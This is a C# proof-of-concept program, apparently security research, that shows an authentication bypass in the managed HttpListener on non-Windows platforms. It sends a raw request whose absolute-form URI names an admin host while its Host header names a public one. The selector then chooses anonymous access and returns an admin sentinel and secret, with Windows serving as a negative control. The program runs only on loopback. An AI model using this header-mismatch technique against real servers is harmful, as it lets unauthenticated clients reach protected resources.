using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

sealed record Observation(
    string Name,
    string FirstLine,
    bool SentinelReturned,
    bool ContextDelivered,
    string SelectorUserHost,
    string SelectorUrlHost,
    AuthenticationSchemes SelectedScheme,
    string ContextUserHost,
    string ContextUrlHost);

class Program
{
    private const string Sentinel = "AUTH_SCHEME_BYPASS_SENTINEL_c2a7";

    private static int FreePort()
    {
        var t = new TcpListener(IPAddress.Loopback, 0);
        t.Start();
        int port = ((IPEndPoint)t.LocalEndpoint).Port;
        t.Stop();
        return port;
    }

    private static async Task<string> ReadResponseAsync(NetworkStream stream)
    {
        var ms = new MemoryStream();
        byte[] buffer = new byte[4096];
        using var cts = new System.Threading.CancellationTokenSource(TimeSpan.FromSeconds(5));
        try
        {
            while (true)
            {
                int n = await stream.ReadAsync(buffer, cts.Token);
                if (n <= 0)
                    break;
                await ms.WriteAsync(buffer.AsMemory(0, n), cts.Token);
            }
        }
        catch (OperationCanceledException)
        {
        }

        return Encoding.ASCII.GetString(ms.ToArray());
    }

    private static async Task<Observation> RunCaseAsync(string name, Func<int, string> requestFactory)
    {
        int port = FreePort();

        using var listener = new HttpListener();
        listener.Prefixes.Add($"http://*:{port}/");
        listener.AuthenticationSchemes = AuthenticationSchemes.None;
        listener.Realm = "admin-research";

        string selectorUserHost = "<not-called>";
        string selectorUrlHost = "<not-called>";
        AuthenticationSchemes selectedScheme = AuthenticationSchemes.None;

        listener.AuthenticationSchemeSelectorDelegate = request =>
        {
            selectorUserHost = request.UserHostName ?? "<null>";
            selectorUrlHost = request.Url?.Host ?? "<null>";

            string hostOnly = selectorUserHost.Split(':')[0];
            selectedScheme = string.Equals(hostOnly, "public.test", StringComparison.OrdinalIgnoreCase)
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Basic;

            Console.WriteLine(
                $"SELECTOR case={name} UserHostName={selectorUserHost} Url.Host={selectorUrlHost} Selected={selectedScheme}");

            return selectedScheme;
        };

        listener.Start();
        Task<HttpListenerContext> contextTask = listener.GetContextAsync();

        using var client = new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback, port);
        using NetworkStream ns = client.GetStream();

        string raw = requestFactory(port);
        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
        await ns.FlushAsync();

        Task<string> responseTask = ReadResponseAsync(ns);
        Task first = await Task.WhenAny(contextTask, responseTask, Task.Delay(TimeSpan.FromSeconds(5)));

        bool contextDelivered = false;
        string contextUserHost = "<none>";
        string contextUrlHost = "<none>";

        if (first == contextTask && contextTask.IsCompletedSuccessfully)
        {
            contextDelivered = true;
            HttpListenerContext context = await contextTask;
            contextUserHost = context.Request.UserHostName ?? "<null>";
            contextUrlHost = context.Request.Url?.Host ?? "<null>";

            bool adminRoute = string.Equals(contextUrlHost, "admin.test", StringComparison.OrdinalIgnoreCase);
            string payload = adminRoute
                ? Sentinel + "\nADMIN_SECRET=research-only-secret\n"
                : "PUBLIC_RESOURCE\n";

            byte[] body = Encoding.ASCII.GetBytes(payload);
            context.Response.StatusCode = 200;
            context.Response.ContentLength64 = body.Length;
            await context.Response.OutputStream.WriteAsync(body);
            context.Response.Close();
        }

        string response = await responseTask;
        string firstLine = response.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None)[0];
        bool sentinelReturned = response.Contains(Sentinel, StringComparison.Ordinal);

        listener.Stop();

        var observation = new Observation(
            name,
            firstLine,
            sentinelReturned,
            contextDelivered,
            selectorUserHost,
            selectorUrlHost,
            selectedScheme,
            contextUserHost,
            contextUrlHost);

        Console.WriteLine(
            $"RESULT case={name} first={firstLine} context={contextDelivered} " +
            $"selectorUserHost={selectorUserHost} selectorUrlHost={selectorUrlHost} scheme={selectedScheme} " +
            $"contextUserHost={contextUserHost} contextUrlHost={contextUrlHost} sentinel={sentinelReturned}");

        return observation;
    }

    private static void Require(bool condition, string message)
    {
        if (!condition)
            throw new Exception("ASSERTION_FAILED: " + message);
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");
        Console.WriteLine($"ARCH={RuntimeInformation.ProcessArchitecture}");

        Observation publicOrigin = await RunCaseAsync(
            "PUBLIC_ORIGIN",
            p => "GET /public HTTP/1.1\r\n" +
                 "Host: public.test\r\n" +
                 "Connection: close\r\n\r\n");

        Observation adminOrigin = await RunCaseAsync(
            "ADMIN_ORIGIN",
            p => "GET /admin HTTP/1.1\r\n" +
                 "Host: admin.test\r\n" +
                 "Connection: close\r\n\r\n");

        Observation conflict = await RunCaseAsync(
            "ABSOLUTE_ADMIN_HOST_PUBLIC",
            p => $"GET http://admin.test:{p}/admin HTTP/1.1\r\n" +
                 "Host: public.test\r\n" +
                 "Connection: close\r\n\r\n");

        Require(publicOrigin.FirstLine.Contains("200"), "public origin must remain accessible");
        Require(!publicOrigin.SentinelReturned, "public origin must not receive admin sentinel");
        Require(adminOrigin.FirstLine.Contains("401"), "ordinary admin origin must require Basic authentication");
        Require(!adminOrigin.SentinelReturned, "ordinary unauthenticated admin request must not receive admin sentinel");

        if (OperatingSystem.IsWindows())
        {
            Require(conflict.FirstLine.Contains("401"), "Windows control must challenge mismatched absolute-form request");
            Require(!conflict.SentinelReturned, "Windows control must not return admin sentinel");
            Require(conflict.SelectedScheme == AuthenticationSchemes.Basic, "Windows must select Basic for admin authority");
            Require(conflict.SelectorUserHost.StartsWith("admin.test", StringComparison.OrdinalIgnoreCase),
                "Windows must canonicalize UserHostName to absolute-form authority");

            Console.WriteLine("WINDOWS_HTTP_SYS_NEGATIVE_CONTROL=PASS");
        }
        else
        {
            Require(conflict.FirstLine.Contains("200"), "managed HttpListener conflict request should reach context");
            Require(conflict.ContextDelivered, "managed HttpListener must deliver conflict request to application");
            Require(conflict.SelectedScheme == AuthenticationSchemes.Anonymous,
                "managed selector must incorrectly choose Anonymous from stale Host field");
            Require(string.Equals(conflict.SelectorUserHost, "public.test", StringComparison.OrdinalIgnoreCase),
                "managed UserHostName must remain attacker supplied public Host");
            Require(string.Equals(conflict.SelectorUrlHost, "admin.test", StringComparison.OrdinalIgnoreCase),
                "managed Url.Host must be admin absolute-form authority");
            Require(conflict.SentinelReturned, "admin research sentinel must reach unauthenticated client");

            Console.WriteLine("AUTHENTICATION_SCHEME_SELECTOR_BYPASS=CONFIRMED");
        }
    }
}
